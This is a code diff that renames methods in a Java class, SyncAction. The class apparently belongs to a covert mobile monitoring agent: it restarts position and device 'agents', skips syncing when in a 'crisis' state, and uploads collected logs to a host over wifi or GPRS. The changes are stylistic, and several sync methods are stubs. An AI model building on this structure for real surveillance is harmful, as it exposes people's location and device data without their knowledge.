@@ -33,23 +33,23 @@ public class SyncAction extends SubAction {
 
     String host = "";
 
-    public SyncAction(int actionId, byte[] confParams) {
-        super(actionId);
-        Parse(confParams);
+    public SyncAction(int actionId_, byte[] confParams) {
+        super(actionId_);
+        parse(confParams);
 
-        Check.requires(ActionId == ACTION_SYNC, "ActionId scorretto");
+        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
 
         logCollector = LogCollector.getInstance();
         agentManager = AgentManager.getInstance();
         transfer = Transfer.getInstance();
     }
 
-    public SyncAction(String host) {
+    public SyncAction(String host_) {
         super(ACTION_SYNC);
-        this.host = host;
+        this.host = host_;
     }
 
-    public boolean Execute() {
+    public boolean execute() {
 
         if (statusObj.crisis()) {
             debug.warn("SyncAction - no sync, we are in crisis");
@@ -63,7 +63,7 @@ public class SyncAction extends SubAction {
 
         // check dei parametri
 
-        ReadParams();
+        readParams();
 
         // Stop degli agenti che producono un singolo log
         agentManager.reStart(Agent.AGENT_POSITION);
@@ -74,7 +74,7 @@ public class SyncAction extends SubAction {
         // l'agente device si comporta diversamente
         agentManager.reStart(Agent.AGENT_DEVICE);
 
-        Utils.Sleep(2500);
+        Utils.sleep(2500);
 
         int ret = internetSync();
 
@@ -88,7 +88,7 @@ public class SyncAction extends SubAction {
         // eventuale sync via wifi se il display e' spento
 
         if (wifi) {
-            ret = WifiSync();
+            ret = wifiSync();
 
             if (ret != 0) {
                 debug.trace("WifiSync OK");
@@ -99,7 +99,7 @@ public class SyncAction extends SubAction {
         }
 
         if (gprs) {
-            ret = GprsSync();
+            ret = gprsSync();
 
             if (ret != 0) {
                 debug.trace("Gprs OK");
@@ -114,7 +114,7 @@ public class SyncAction extends SubAction {
         return false;
     }
 
-    private int GprsSync() {
+    private int gprsSync() {
         // TODO Auto-generated method stub
         return 0;
     }
@@ -140,7 +140,7 @@ public class SyncAction extends SubAction {
         return ret;
     }
 
-    protected boolean Parse(byte[] confParams) {
+    protected boolean parse(byte[] confParams) {
         DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
@@ -162,12 +162,12 @@ public class SyncAction extends SubAction {
         return true;
     }
 
-    private void ReadParams() {
+    private void readParams() {
         // TODO Auto-generated method stub
 
     }
 
-    private int WifiSync() {
+    private int wifiSync() {
         // TODO Auto-generated method stub
         return 0;
     }
